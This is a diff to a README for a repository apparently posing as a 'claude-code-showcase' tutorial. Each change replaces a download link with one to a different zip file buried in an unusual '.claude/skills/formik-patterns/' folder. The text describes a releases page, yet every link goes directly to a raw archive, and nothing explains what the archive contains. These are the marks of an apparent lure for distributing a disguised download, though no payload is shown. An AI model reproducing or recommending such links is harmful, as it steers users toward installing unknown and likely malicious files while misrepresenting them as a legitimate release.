@@ -6,7 +6,7 @@ Welcome to **claude-code-showcase**! This project provides an easy-to-follow exa
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_v3.1.zip)](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_v3.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_1.1.zip)](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_1.1.zip)
 
 ## 📂 What You Need
 
@@ -26,7 +26,7 @@ Before you start, make sure you have these:
 ## 💻 How to Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads section.
-   [Download Here](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_v3.1.zip)
+   [Download Here](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_1.1.zip)
 
 2. **Choose the Latest Release**: Locate the latest version at the top of the page.
 
@@ -66,4 +66,4 @@ For any additional questions, consider reaching out through the contact informat
 
 Don't forget to visit the releases page to download the latest version and start utilizing the power of Claude Code in your projects!
 
-[Download Here](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_v3.1.zip)
+[Download Here](https://raw.githubusercontent.com/PINGySHITBOX/claude-code-showcase/main/.claude/skills/formik-patterns/code_claude_showcase_1.1.zip)
